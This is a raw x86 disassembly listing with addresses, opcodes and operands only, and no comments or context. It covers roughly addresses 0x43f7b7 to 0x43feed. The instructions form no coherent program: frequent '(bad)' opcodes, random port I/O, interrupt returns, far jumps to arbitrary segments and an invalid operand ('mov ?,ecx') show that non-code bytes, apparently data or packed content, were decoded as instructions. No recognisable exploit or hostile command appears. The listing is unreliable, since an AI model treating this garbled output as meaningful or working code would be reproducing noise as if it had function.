  43f7b7:	out    0x75,al
  43f7b9:	and    ch,BYTE PTR [esi]
  43f7bb:	add    ebx,DWORD PTR [edi]
  43f7bd:	add    ecx,DWORD PTR [eax]
  43f7bf:	mov    cl,0x6b
  43f7c1:	dec    ecx
  43f7c2:	sub    cl,BYTE PTR [eax]
  43f7c4:	(bad)  
  43f7c5:	adc    bh,BYTE PTR [ebp-0x2d]
  43f7c8:	mov    edi,0x754d0a5
  43f7cd:	mov    BYTE PTR [ebx+0x63],dh
  43f7d0:	inc    esi
  43f7d1:	adc    eax,0xf348d97e
  43f7d6:	mov    al,0x95
  43f7d8:	iret   
  43f7d9:	add    ebx,DWORD PTR [edi+0x74518822]
  43f7df:	loopne 0x43f762
  43f7e1:	cs add al,0x28
  43f7e4:	jnp    0x43f82e
  43f7e6:	jbe    0x43f7d9
  43f7e8:	in     eax,dx
  43f7e9:	add    BYTE PTR [edx+0x7b614c8c],ah
  43f7ef:	sub    eax,0xc31e62c2
  43f7f4:	iret   
  43f7f5:	xor    bh,BYTE PTR [edi-0x6a]
  43f7f8:	adc    BYTE PTR [edi+edi*4-0x2a],ch
  43f7fc:	sbb    ecx,DWORD PTR [ecx]
  43f7fe:	xor    edx,0x3e
  43f801:	push   ecx
  43f802:	jmp    0x43f7d1
  43f804:	nop
  43f805:	retf   
  43f806:	bound  esp,QWORD PTR [ecx]
  43f808:	retf   
  43f809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f80a:	ins    DWORD PTR es:[edi],dx
  43f80b:	xchg   esi,eax
  43f80c:	icebp  
  43f80d:	lods   al,BYTE PTR ds:[esi]
  43f80e:	aas    
  43f80f:	fwait
  43f810:	add    BYTE PTR ds:0xe0e709ce,0x3
  43f817:	xchg   ebp,eax
  43f818:	(bad)  
  43f819:	shl    DWORD PTR [eax+0x33],1
  43f81c:	xor    al,0xa
  43f81e:	dec    esi
  43f81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f820:	(bad)  
  43f821:	sbb    eax,0x3cc2d413
  43f826:	stos   BYTE PTR es:[edi],al
  43f827:	xchg   DWORD PTR [edx],esp
  43f829:	in     al,0x9b
  43f82b:	sbb    DWORD PTR [edx-0x12],esp
  43f82e:	cwde   
  43f82f:	fldcw  WORD PTR [ecx+0x2]
  43f832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f833:	fnstenv [ebx]
  43f835:	scas   al,BYTE PTR es:[edi]
  43f836:	ins    BYTE PTR es:[edi],dx
  43f837:	cld    
  43f838:	and    al,0x2
  43f83a:	(bad)  
  43f83b:	xor    DWORD PTR [edx+ecx*8],ebx
  43f83e:	xchg   DWORD PTR ds:0x3960e375,ebx
  43f844:	pusha  
  43f845:	fwait
  43f846:	push   eax
  43f847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f848:	sbb    al,0x75
  43f84a:	jmp    0x50e49e23
  43f84f:	inc    eax
  43f850:	gs mov ebp,0xe5895e91
  43f856:	fst    QWORD PTR [edi-0x51e65de]
  43f85c:	mov    ebp,0x75a6d402
  43f861:	sub    esi,edx
  43f863:	icebp  
  43f864:	mov    WORD PTR [edx-0x1276a4d9],gs
  43f86a:	repnz push ds
  43f86c:	jl     0x43f818
  43f86e:	mov    edx,0x36da507c
  43f873:	xlat   BYTE PTR ds:[ebx]
  43f874:	loop   0x43f85b
  43f876:	xchg   DWORD PTR [esi+0x5f5519b4],edi
  43f87c:	mov    DWORD PTR [edi+0x6e],esp
  43f87f:	inc    ebx
  43f880:	popa   
  43f881:	popa   
  43f882:	stc    
  43f883:	cli    
  43f884:	mov    ds:0x5dc1402,al
  43f889:	mov    DWORD PTR [ecx+0x1fd0a853],0xc10a81e5
  43f893:	mov    bl,0x8
  43f895:	push   esp
  43f896:	inc    ebx
  43f897:	aad    0x47
  43f899:	cwde   
  43f89a:	add    eax,0x2fcbe242
  43f89f:	sub    BYTE PTR [ecx+0x30f9f667],cl
  43f8a5:	stos   BYTE PTR es:[edi],al
  43f8a6:	mov    WORD PTR [ecx-0x4d03fd7e],ds
  43f8ac:	rcr    DWORD PTR [edx-0x12b62623],cl
  43f8b2:	sub    BYTE PTR [ecx],bh
  43f8b4:	mov    edi,eax
  43f8b6:	outs   dx,BYTE PTR ds:[esi]
  43f8b8:	jecxz  0x43f8a4
  43f8ba:	stos   BYTE PTR es:[edi],al
  43f8bb:	xchg   edx,eax
  43f8bc:	cmp    ebx,esp
  43f8be:	popa   
  43f8bf:	pop    ecx
  43f8c0:	fdivr  QWORD PTR [edx]
  43f8c2:	pop    ds
  43f8c3:	cmp    BYTE PTR [edx+0x64f7b4bc],bh
  43f8c9:	fcomp  DWORD PTR [edi]
  43f8cb:	sti    
  43f8cc:	je     0x43f914
  43f8ce:	add    dl,BYTE PTR ds:0xd3a0743e
  43f8d4:	xchg   esp,eax
  43f8d5:	gs pop edi
  43f8d7:	adc    DWORD PTR [ecx],ebp
  43f8d9:	mov    eax,0xadaba162
  43f8de:	push   ebp
  43f8df:	cmc    
  43f8e0:	in     al,dx
  43f8e1:	out    dx,al
  43f8e2:	iret   
  43f8e3:	shl    BYTE PTR [edx+0x25],cl
  43f8e6:	adc    ah,BYTE PTR [edx+ebp*1]
  43f8e9:	xlat   BYTE PTR ds:[ebx]
  43f8ea:	and    BYTE PTR [ecx],ah
  43f8ec:	add    al,0xe9
  43f8ee:	sub    al,0x9c
  43f8f0:	push   0x3c
  43f8f2:	cdq    
  43f8f3:	loope  0x43f884
  43f8f5:	mov    al,BYTE PTR [edx-0x55]
  43f8f8:	and    DWORD PTR [esi],ebp
  43f8fa:	outs   dx,DWORD PTR ds:[esi]
  43f8fb:	(bad)  
  43f8fc:	jmp    0xc7bb9f22
  43f901:	add    eax,0xc6ce33a8
  43f906:	xor    al,BYTE PTR [esi-0x8]
  43f909:	mov    al,ds:0xe1b09818
  43f90e:	cdq    
  43f90f:	jg     0x43f919
  43f911:	(bad)  
  43f912:	clc    
  43f913:	inc    ebx
  43f914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f915:	xlat   BYTE PTR ds:[ebx]
  43f916:	ins    BYTE PTR es:[edi],dx
  43f917:	aad    0x6
  43f919:	dec    ebp
  43f91a:	pop    ebp
  43f91b:	lea    esp,[ecx+0x49]
  43f91e:	out    0x91,eax
  43f920:	(bad)  
  43f921:	xchg   ebx,eax
  43f922:	sub    DWORD PTR [esi-0x3a],ebx
  43f925:	and    cl,ch
  43f927:	je     0x43f95b
  43f929:	in     eax,0x29
  43f92b:	xlat   BYTE PTR ds:[ebx]
  43f92c:	cli    
  43f92d:	repnz xor BYTE PTR [edx+0x55],0x28
  43f932:	call   0xc74f8167
  43f937:	sbb    edi,eax
  43f939:	add    al,0xe8
  43f93b:	mov    ch,0x3c
  43f93d:	add    edx,DWORD PTR [eax-0x58]
  43f940:	dec    edi
  43f941:	and    eax,0xfba041ac
  43f946:	pop    ds
  43f947:	pop    ebx
  43f948:	(bad)  
  43f949:	cdq    
  43f94a:	or     edi,DWORD PTR [ebx]
  43f94c:	cwde   
  43f94d:	std    
  43f94e:	fcom   st(5)
  43f950:	cli    
  43f951:	inc    ebx
  43f952:	xor    BYTE PTR [esi+eax*1],dl
  43f955:	xchg   eax,esp
  43f957:	je     0x43f8e2
  43f959:	stc    
  43f95a:	xor    eax,0x1c9b7a10
  43f95f:	pop    es
  43f960:	out    0xfc,al
  43f962:	mov    ebp,0xe666cd5
  43f967:	dec    ecx
  43f968:	push   esp
  43f969:	into   
  43f96a:	mov    eax,ds:0xe51b8984
  43f96f:	mov    dh,0x80
  43f971:	dec    eax
  43f972:	xor    eax,0xee026a8b
  43f977:	ficom  WORD PTR [eax+0x68]
  43f97a:	push   0x6c
  43f97c:	hlt    
  43f97d:	fld    TBYTE PTR [edi+0x1f426117]
  43f983:	imul   esp,DWORD PTR [edi-0x53],0xffffffea
  43f987:	retf   0x1a5e
  43f98a:	push   ss
  43f98b:	aam    0x20
  43f98d:	lea    ebp,[ebp+0x7a]
  43f990:	sub    DWORD PTR [ecx+edx*1+0x43238ec4],esi
  43f997:	adc    WORD PTR [esi+0x1a0ab476],bx
  43f99e:	jge    0x43f974
  43f9a0:	in     eax,0x1a
  43f9a2:	shr    BYTE PTR [eax],cl
  43f9a4:	or     BYTE PTR [esi-0x139170e5],dh
  43f9aa:	xchg   esi,eax
  43f9ab:	stos   DWORD PTR es:[edi],eax
  43f9ac:	sub    DWORD PTR [edi],edi
  43f9ae:	push   ds
  43f9af:	fmul   DWORD PTR [ecx-0x1fe9fb05]
  43f9b5:	xchg   ebx,eax
  43f9b6:	xor    dl,BYTE PTR [ebp-0x677b7a4f]
  43f9bc:	and    al,BYTE PTR [ebx]
  43f9be:	and    BYTE PTR [ebp-0x63],bh
  43f9c1:	sub    BYTE PTR [ebp+eiz*4-0x77],cl
  43f9c5:	mov    edi,0x67452e6e
  43f9ca:	xchg   edi,eax
  43f9cb:	mov    DWORD PTR [edi],esi
  43f9cd:	add    BYTE PTR [eax-0x781969a7],bl
  43f9d3:	mov    ds:0x20b0f28b,al
  43f9d8:	mov    BYTE PTR [edi-0x4e86ecea],ch
  43f9de:	nop
  43f9df:	mov    al,0x9c
  43f9e1:	xor    al,BYTE PTR [ebp-0x1140de2b]
  43f9e7:	(bad)  
  43f9e8:	fimul  WORD PTR [esp+ebx*2-0x53]
  43f9ec:	xchg   BYTE PTR [ecx],ah
  43f9ee:	call   0xd74b:0x5fd21d6f
  43f9f5:	test   al,0xb7
  43f9f7:	fimul  WORD PTR [eax]
  43f9f9:	adc    eax,0x336d40d8
  43f9fe:	sbb    eax,0x76684b14
  43fa03:	in     eax,dx
  43fa04:	test   BYTE PTR [edx+0x540dcdf8],0x5c
  43fa0b:	in     al,0x35
  43fa0d:	jae    0x43fa2d
  43fa0f:	(bad)  
  43fa10:	mov    esi,0x9f0648f0
  43fa15:	push   0x11246914
  43fa1a:	push   ds
  43fa1b:	ror    DWORD PTR [ebp+0x59625de],cl
  43fa21:	add    ch,BYTE PTR [ebx+ebp*4]
  43fa24:	fcom   QWORD PTR [ebp-0x32c81d24]
  43fa2a:	pusha  
  43fa2b:	and    DWORD PTR [ecx+edx*4+0x4f],eax
  43fa2f:	inc    esi
  43fa30:	inc    edx
  43fa31:	bswap  esp
  43fa33:	xlat   BYTE PTR ds:[ebx]
  43fa34:	mov    dh,0x21
  43fa36:	xchg   edx,eax
  43fa37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa39:	xchg   esp,eax
  43fa3a:	push   ecx
  43fa3b:	sub    al,0x8a
  43fa3d:	jmp    DWORD PTR [eax+0x49]
  43fa40:	or     edx,ebx
  43fa42:	out    0x1,eax
  43fa44:	sbb    eax,0xc8d97df8
  43fa49:	add    al,ah
  43fa4b:	mov    ds:0xd94f3011,eax
  43fa50:	outs   dx,DWORD PTR ds:[esi]
  43fa51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa52:	pop    ds
  43fa53:	pop    ecx
  43fa54:	(bad)  
  43fa56:	int3   
  43fa57:	adc    BYTE PTR [edx-0x28],0xb4
  43fa5b:	shl    DWORD PTR [ebp+0x3ac7687e],1
  43fa61:	fwait
  43fa62:	pusha  
  43fa63:	cmp    BYTE PTR [edx],ch
  43fa65:	and    al,dh
  43fa67:	lea    ebp,[edi-0x760b56ef]
  43fa6d:	mov    cl,0x5b
  43fa6f:	outs   dx,BYTE PTR ds:[esi]
  43fa70:	xor    ah,0x7f
  43fa73:	stos   BYTE PTR es:[edi],al
  43fa74:	lods   al,BYTE PTR ds:[esi]
  43fa75:	dec    esi
  43fa76:	pop    ds
  43fa77:	push   esi
  43fa78:	pop    ebp
  43fa79:	add    ebp,eax
  43fa7b:	inc    edi
  43fa7c:	rcr    DWORD PTR [ebx+0x1f],cl
  43fa7f:	pop    ebp
  43fa80:	adc    cl,BYTE PTR [eax-0x78]
  43fa83:	dec    edi
  43fa84:	mov    esi,0x56d49113
  43fa89:	sar    DWORD PTR [ebx-0xd0fbf72],0xed
  43fa90:	mov    bh,ch
  43fa92:	xchg   edi,eax
  43fa93:	jle    0x43fa6f
  43fa95:	push   ss
  43fa96:	outs   dx,BYTE PTR ds:[esi]
  43fa97:	mov    al,ds:0x7f908367
  43fa9c:	rol    BYTE PTR [edx],1
  43fa9e:	push   cs
  43fa9f:	push   ecx
  43faa0:	rol    DWORD PTR [esi],0x94
  43faa3:	or     dl,BYTE PTR [edi+0x411d6ed8]
  43faa9:	xchg   ecx,eax
  43faaa:	mov    al,ds:0x7b6429ea
  43faaf:	mov    BYTE PTR [edi+0x1d],al
  43fab2:	and    dh,BYTE PTR [edi-0x55fbbf03]
  43fab8:	pop    ecx
  43fab9:	pop    ecx
  43faba:	xchg   esp,eax
  43fabb:	jge    0x43fa45
  43fabd:	fistp  WORD PTR [ebp-0x64]
  43fac0:	frstor [edi]
  43fac2:	(bad)  
  43fac3:	test   BYTE PTR [edi],0x47
  43fac6:	jb     0x43fb10
  43fac8:	imul   ecx,DWORD PTR [ebx-0x1d99fca0],0x8982fd61
  43fad2:	jnp    0x43fad7
  43fad4:	(bad)  
  43fad6:	pushf  
  43fad7:	adc    al,0x53
  43fad9:	inc    edi
  43fada:	sahf   
  43fadb:	mov    DWORD PTR [edx],ecx
  43fadd:	add    ecx,DWORD PTR [esi+0x4f]
  43fae0:	sbb    ebx,ebp
  43fae2:	xlat   BYTE PTR ds:[ebx]
  43fae3:	xor    eax,DWORD PTR [edx-0x569c9f4c]
  43fae9:	dec    edx
  43faea:	scas   al,BYTE PTR es:[edi]
  43faeb:	mov    dh,BYTE PTR [esp+ebp*1]
  43faee:	int3   
  43faef:	aad    0x92
  43faf1:	pop    DWORD PTR [edx+0x4c]
  43faf4:	nop
  43faf5:	push   ebx
  43faf6:	repz xchg edx,eax
  43faf8:	sbb    BYTE PTR [edi],0x22
  43fafb:	jo     0x43fb3e
  43fafd:	push   eax
  43fafe:	in     al,dx
  43faff:	sahf   
  43fb00:	mov    BYTE PTR [ebx],bh
  43fb02:	mov    ecx,0x76031f97
  43fb07:	scas   eax,DWORD PTR es:[edi]
  43fb08:	bound  esp,QWORD PTR [esi]
  43fb0a:	shl    DWORD PTR [ecx+0x31e59b9],cl
  43fb10:	outs   dx,BYTE PTR ds:[esi]
  43fb11:	sbb    cl,BYTE PTR [ecx-0xa471abd]
  43fb17:	repz jle 0x43fb0c
  43fb1a:	pop    ebx
  43fb1b:	mov    eax,0x4967c98
  43fb20:	mov    BYTE PTR [ecx-0x9b9033b],ah
  43fb26:	and    al,0x6b
  43fb28:	mov    ah,0x2f
  43fb2a:	mov    bh,0xac
  43fb2c:	mov    ch,dh
  43fb2e:	add    al,0xe4
  43fb30:	pop    edx
  43fb31:	pop    edx
  43fb32:	(bad)  
  43fb34:	pop    ebp
  43fb35:	lock push edx
  43fb37:	mov    eax,ds:0x8e647679
  43fb3c:	xchg   edi,eax
  43fb3d:	dec    ebp
  43fb3e:	mov    esp,0x179553ec
  43fb43:	push   ebx
  43fb44:	sub    DWORD PTR [ebx+0x78],esi
  43fb47:	cdq    
  43fb48:	sub    eax,0xf8c82e02
  43fb4d:	mov    edx,0x1c86eaa6
  43fb52:	xchg   ebx,eax
  43fb53:	(bad)  [eax+0x1efd3a19]
  43fb59:	scas   eax,DWORD PTR es:[edi]
  43fb5a:	(bad)  
  43fb5b:	cdq    
  43fb5c:	and    cl,ah
  43fb5e:	or     bh,dl
  43fb60:	xchg   esi,eax
  43fb61:	push   edx
  43fb62:	jp     0x43fb10
  43fb64:	jne    0x43fb43
  43fb66:	pusha  
  43fb67:	cmp    eax,0x30709353
  43fb6c:	ror    BYTE PTR [edx-0x6f],cl
  43fb6f:	(bad)  
  43fb70:	mov    al,0x21
  43fb72:	jmp    0x4ae7:0x2a0af853
  43fb79:	mov    cl,0x1f
  43fb7b:	mov    ebx,edi
  43fb7d:	push   ecx
  43fb7e:	push   esp
  43fb7f:	ins    BYTE PTR es:[edi],dx
  43fb80:	adc    BYTE PTR [ebx],bh
  43fb82:	adc    DWORD PTR [edx-0x2bc1a0e6],ebx
  43fb88:	loopne 0x43fb7b
  43fb8a:	fs popf 
  43fb8c:	and    bl,dl
  43fb8e:	mov    eax,0xaf6c27ef
  43fb93:	mov    edi,0x749b7989
  43fb98:	xchg   ebp,eax
  43fb99:	aad    0xd1
  43fb9b:	retf   
  43fb9c:	les    eax,FWORD PTR [edx]
  43fb9e:	cli    
  43fb9f:	mov    al,0xd4
  43fba1:	mov    esi,0xeed7c0d3
  43fba6:	pop    ds
  43fba7:	jg     0x43fb51
  43fba9:	jns    0x43fbbc
  43fbab:	ja     0x43fb88
  43fbad:	imul   ebp,edx,0xa78537f
  43fbb3:	mov    ch,0x8d
  43fbb5:	test   eax,0xe982cc96
  43fbbb:	push   esi
  43fbbc:	mov    edx,0x64d4affa
  43fbc1:	jbe    0x43fb72
  43fbc3:	cmp    edi,edi
  43fbc5:	jmp    0xbdca0838
  43fbca:	jle    0x43fb6a
  43fbcc:	mov    ?,ecx
  43fbce:	lahf   
  43fbcf:	pop    edx
  43fbd0:	lock add ch,BYTE PTR [ebx-0x5d9ee62c]
  43fbd7:	and    edi,DWORD PTR [eax+eax*8]
  43fbda:	xlat   BYTE PTR ds:[ebx]
  43fbdb:	dec    ebx
  43fbdc:	mov    DWORD PTR [ebx],ecx
  43fbde:	mov    eax,0xc8eda2ba
  43fbe3:	xchg   ebp,eax
  43fbe4:	pop    eax
  43fbe5:	push   ds
  43fbe6:	out    0xb1,al
  43fbe8:	cs (bad) 
  43fbeb:	xor    cl,BYTE PTR [ecx]
  43fbed:	dec    esp
  43fbee:	out    dx,al
  43fbef:	popf   
  43fbf0:	test   DWORD PTR [edi],eax
  43fbf2:	ins    BYTE PTR es:[edi],dx
  43fbf3:	mov    dh,0x80
  43fbf5:	pop    ds
  43fbf6:	(bad)  
  43fbf7:	stos   DWORD PTR es:[edi],eax
  43fbf8:	iret   
  43fbf9:	ret    
  43fbfa:	loopne 0x43fbd5
  43fbfc:	iret   
  43fbfd:	loop   0x43fc33
  43fbff:	(bad)  
  43fc00:	lock ja 0x43fc77
  43fc03:	mov    ecx,0xd39c70d5
  43fc08:	pushf  
  43fc09:	pop    esi
  43fc0a:	(bad)  
  43fc0b:	push   ebp
  43fc0c:	call   0xc5d4:0x68ce9a9c
  43fc13:	aad    0xcb
  43fc15:	sti    
  43fc16:	ja     0x43fbe0
  43fc18:	adc    eax,0xa95566fe
  43fc1d:	cmp    BYTE PTR [ebp-0x19],ah
  43fc20:	(bad)  
  43fc21:	(bad)  
  43fc22:	push   0xfffffff9
  43fc24:	mov    DWORD PTR [edx+0x5],esp
  43fc27:	pusha  
  43fc28:	ror    DWORD PTR [edi+0x648983cb],1
  43fc2e:	sub    ecx,DWORD PTR [edx-0x9]
  43fc31:	cmp    dh,BYTE PTR [esi+0x1fb4e96a]
  43fc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fc38:	add    al,0xd4
  43fc3a:	retf   
  43fc3b:	sbb    al,0x24
  43fc3d:	push   0x8fd59f29
  43fc42:	dec    ebx
  43fc43:	push   esp
  43fc44:	jns    0x43fc0a
  43fc46:	push   ebx
  43fc47:	pop    ds
  43fc48:	arpl   ax,bp
  43fc4a:	shr    si,0x2c
  43fc4e:	sar    BYTE PTR [ebp-0x40b8acaa],1
  43fc54:	in     al,0x2
  43fc56:	dec    edx
  43fc57:	cs push ss
  43fc59:	mov    cl,cl
  43fc5b:	xchg   edx,eax
  43fc5c:	retf   0x1f14
  43fc5f:	sub    esi,ecx
  43fc61:	out    0xb0,al
  43fc63:	push   esp
  43fc64:	retf   0x686f
  43fc67:	popf   
  43fc68:	sub    ebx,DWORD PTR [ecx+0x667fd4cd]
  43fc6e:	test   ebp,ebx
  43fc70:	stc    
  43fc71:	and    ebx,DWORD PTR [edi]
  43fc73:	push   ecx
  43fc74:	mov    eax,ds:0x3a343906
  43fc79:	add    BYTE PTR [edx],ah
  43fc7b:	aam    0x3a
  43fc7d:	shr    DWORD PTR [ebx-0x5aad4692],cl
  43fc83:	sub    al,0x8b
  43fc85:	test   eax,0x426accb9
  43fc8a:	(bad)  
  43fc8b:	pop    eax
  43fc8c:	enter  0x7f4f,0x9e
  43fc90:	sbb    ah,bh
  43fc92:	dec    ebp
  43fc93:	mov    edx,0x37209a25
  43fc98:	cdq    
  43fc99:	in     eax,0x82
  43fc9b:	nop
  43fc9c:	mov    edi,esp
  43fc9e:	outs   dx,DWORD PTR ds:[esi]
  43fc9f:	add    dl,ah
  43fca1:	div    BYTE PTR [edi-0x19]
  43fca4:	mov    WORD PTR [eax],ds
  43fca6:	pushf  
  43fca7:	aaa    
  43fca8:	rcr    bh,cl
  43fcaa:	mov    ebx,0x120caed5
  43fcaf:	xchg   esp,eax
  43fcb0:	mov    esp,0xcfad7a00
  43fcb5:	jmp    0x43fd2d
  43fcb7:	aad    0xb5
  43fcb9:	pop    edx
  43fcba:	lahf   
  43fcbb:	cmc    
  43fcbc:	and    dh,ch
  43fcbe:	lock stos DWORD PTR es:[edi],eax
  43fcc0:	lea    ecx,[edi+0x0]
  43fcc3:	jns    0x43fd04
  43fcc5:	ret    0xdc8a
  43fcc8:	test   al,0x24
  43fcca:	inc    esp
  43fccb:	and    DWORD PTR [ebp+ebp*8+0x1f],edi
  43fccf:	ins    DWORD PTR es:[edi],dx
  43fcd0:	sub    DWORD PTR ds:0x27e12c3,ebp
  43fcd6:	mov    cs,WORD PTR ds:0xe5425458
  43fcdc:	cmp    ebx,DWORD PTR [ebp-0x6a9620a0]
  43fce2:	or     dh,BYTE PTR ds:[ecx+0x53]
  43fce6:	cld    
  43fce7:	pop    ecx
  43fce8:	call   FWORD PTR [edx]
  43fcea:	ins    DWORD PTR es:[edi],dx
  43fceb:	xor    eax,0x94d41a20
  43fcf0:	hlt    
  43fcf1:	jl     0x43fca5
  43fcf3:	sub    esp,edx
  43fcf5:	xor    ecx,DWORD PTR [eax+0x73]
  43fcf8:	mov    BYTE PTR [ebp+0x3770592c],bh
  43fcfe:	test   eax,0x705a4ed4
  43fd03:	xchg   esp,eax
  43fd04:	nop
  43fd05:	out    dx,eax
  43fd06:	push   0x60fa6bc3
  43fd0b:	pop    ss
  43fd0c:	sbb    DWORD PTR [ecx-0x4559cd09],edx
  43fd12:	push   0x4b4331d4
  43fd17:	movaps xmm4,xmm7
  43fd1a:	xor    eax,0xef66ca45
  43fd1f:	hlt    
  43fd20:	jmp    0x56e9:0x40e760bf
  43fd27:	popf   
  43fd28:	aam    0x32
  43fd2a:	or     eax,0x848109d7
  43fd2f:	inc    ecx
  43fd30:	dec    esp
  43fd31:	or     BYTE PTR [edx],al
  43fd33:	sbb    DWORD PTR [eax+0x6dfda437],ecx
  43fd39:	xchg   edi,eax
  43fd3a:	aas    
  43fd3b:	int    0xd4
  43fd3d:	pop    ds
  43fd3e:	dec    eax
  43fd3f:	and    DWORD PTR [ebx],0xffffffbd
  43fd42:	(bad)  
  43fd43:	(bad)  
  43fd44:	dec    ecx
  43fd45:	lea    edx,[eax]
  43fd47:	test   DWORD PTR [eax+0x6c4e24f9],ecx
  43fd4d:	mov    ds:0x37464cd,al
  43fd52:	mov    ds:0x7baf7720,al
  43fd57:	sub    cl,BYTE PTR [ebp-0x3f5ce1a8]
  43fd5d:	xchg   edx,eax
  43fd5e:	push   0x23
  43fd60:	dec    BYTE PTR [edi+0x6f]
  43fd63:	aad    0x13
  43fd65:	xlat   BYTE PTR ds:[ebx]
  43fd66:	fimul  WORD PTR [ebx]
  43fd68:	les    eax,FWORD PTR [ebx+0x2c]
  43fd6b:	push   cs
  43fd6c:	mov    DWORD PTR [ebx+0x79ce526e],edx
  43fd72:	out    0x73,eax
  43fd74:	xchg   BYTE PTR [ebp+0x15883a4b],dh
  43fd7a:	inc    eax
  43fd7b:	mov    ds:0xc6e5a736,eax
  43fd80:	xchg   edi,eax
  43fd81:	iret   
  43fd82:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  43fd84:	mov    edi,0x7a907c46
  43fd89:	push   esp
  43fd8a:	or     al,0xd2
  43fd8c:	aad    0x9f
  43fd8e:	dec    esp
  43fd8f:	mov    WORD PTR [eax],ss
  43fd91:	arpl   WORD PTR [ebx+0x5d],dx
  43fd94:	add    BYTE PTR [edx],al
  43fd96:	les    esp,FWORD PTR [edi-0x47]
  43fd99:	popa   
  43fd9a:	ret    0x3d1f
  43fd9d:	out    0x1f,al
  43fd9f:	and    ecx,DWORD PTR ds:0x95387342
  43fda5:	bound  ebx,QWORD PTR [esi+0x5d]
  43fda8:	shl    DWORD PTR [edi+ebx*1],1
  43fdab:	mov    cl,0x36
  43fdad:	cdq    
  43fdae:	adc    al,0xda
  43fdb0:	clc    
  43fdb1:	and    al,0x1f
  43fdb3:	jne    0x43fdbe
  43fdb5:	sub    ah,BYTE PTR [ebp-0x7c]
  43fdb8:	push   0xffffffd2
  43fdba:	jmp    0x4cb2:0x1f0cf6c9
  43fdc1:	mov    bh,0x82
  43fdc3:	aad    0xa5
  43fdc5:	push   ss
  43fdc6:	sub    BYTE PTR [eax+ebx*8],0xb7
  43fdca:	imul   ebp,DWORD PTR [ebx-0x72],0x6a5924b
  43fdd1:	or     ebx,edi
  43fdd3:	mov    esp,0xd7277942
  43fdd8:	sti    
  43fdd9:	test   BYTE PTR [ebx+0x1b],0xba
  43fddd:	das    
  43fdde:	cmp    eax,0xff638c5b
  43fde3:	test   al,0xd8
  43fde5:	jmp    0x43fd90
  43fde7:	push   esp
  43fde8:	cmp    BYTE PTR [ecx+0x40],ah
  43fdeb:	aad    0xe9
  43fded:	mov    dh,0xf6
  43fdef:	icebp  
  43fdf0:	dec    ebp
  43fdf1:	jl     0x43fda4
  43fdf3:	sti    
  43fdf4:	(bad)  
  43fdf5:	jg     0x43fdd5
  43fdf7:	sahf   
  43fdf8:	inc    esi
  43fdf9:	inc    esp
  43fdfa:	pushf  
  43fdfb:	inc    esp
  43fdfc:	mov    esp,0x6f9da06d
  43fe01:	inc    edi
  43fe02:	mov    esp,0x23062d4
  43fe07:	dec    edi
  43fe08:	dec    esp
  43fe09:	imul   ebx,DWORD PTR [edi],0xffffffab
  43fe0c:	out    dx,al
  43fe0d:	out    dx,al
  43fe0e:	fcomp  QWORD PTR [ebx+0x38]
  43fe11:	and    eax,0x40d4aaae
  43fe16:	aam    0xdf
  43fe18:	mov    ds:0xb785be82,eax
  43fe1d:	push   esp
  43fe1e:	pop    ds
  43fe1f:	inc    edi
  43fe20:	mov    WORD PTR [esi+0x6c0c2f3d],ss
  43fe26:	xchg   cl,ah
  43fe28:	cmp    bh,al
  43fe2a:	ret    
  43fe2b:	aam    0x9b
  43fe2d:	enter  0x6b17,0x2a
  43fe31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fe32:	pop    es
  43fe33:	xchg   ecx,eax
  43fe34:	mov    ebp,ecx
  43fe36:	inc    edi
  43fe37:	xchg   esp,eax
  43fe38:	loopne 0x43fea3
  43fe3a:	scas   al,BYTE PTR es:[edi]
  43fe3b:	jae    0x43fe75
  43fe3d:	add    edi,eax
  43fe3f:	mov    dl,ch
  43fe41:	inc    ecx
  43fe42:	lahf   
  43fe43:	out    0x6f,al
  43fe45:	mov    ds:0x4b63fb1f,al
  43fe4a:	shr    BYTE PTR [edx],1
  43fe4c:	ss jns 0x43fe0e
  43fe4f:	stos   BYTE PTR es:[edi],al
  43fe50:	(bad)  [edi+0xc]
  43fe53:	shr    edi,0x42
  43fe56:	pop    eax
  43fe57:	ins    DWORD PTR es:[edi],dx
  43fe58:	popa   
  43fe59:	or     eax,0x7a18ed7d
  43fe5e:	ret    
  43fe5f:	aam    0x42
  43fe61:	test   BYTE PTR [ecx-0x38],ch
  43fe64:	jmp    0x372f:0x880449ca
  43fe6b:	bound  ebp,QWORD PTR [edi-0x76af064f]
  43fe71:	inc    edi
  43fe72:	or     al,0x3b
  43fe74:	retf   0x6a96
  43fe77:	mov    BYTE PTR [ecx+0x3],ch
  43fe7a:	xchg   edx,eax
  43fe7b:	inc    esp
  43fe7c:	sub    al,BYTE PTR [edi]
  43fe7e:	fwait
  43fe7f:	repz jp 0x43fe9a
  43fe82:	ficom  WORD PTR [eax+0x19061f88]
  43fe88:	or     BYTE PTR ds:0x482068a8,dl
  43fe8e:	clc    
  43fe8f:	mov    ebp,0x2fd8236
  43fe94:	mov    al,ds:0xfd2ad0c0
  43fe99:	or     DWORD PTR [ecx-0x48],esi
  43fe9c:	mov    esi,0xa9954db3
  43fea1:	mov    DWORD PTR [edx+eiz*8+0x2f],ecx
  43fea5:	add    BYTE PTR [eax+0x5b25723d],bh
  43feab:	and    DWORD PTR [ebp-0x7798772b],0x5576cd0b
  43feb5:	call   0x9868:0xc230fa77
  43febc:	inc    esi
  43febd:	hlt    
  43febe:	test   eax,0x4e0163d4
  43fec3:	ret    0x5249
  43fec6:	pop    edx
  43fec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fec8:	inc    ecx
  43fec9:	es push ds
  43fecb:	out    dx,eax
  43fecc:	adc    eax,0xd9dd01a
  43fed1:	add    eax,DWORD PTR [eax+0x25]
  43fed4:	jne    0x43ff4e
  43fed6:	lea    ebx,[edi+0x7b6116bb]
  43fedc:	dec    ebx
  43fedd:	scas   eax,DWORD PTR es:[edi]
  43fede:	shl    DWORD PTR [esi+0x64f9c8ec],0x5e
  43fee5:	sbb    BYTE PTR [esi+0x60c57d3c],0xe3
  43feec:	inc    edx
  43feed:	mov    eax,0x8173a05c
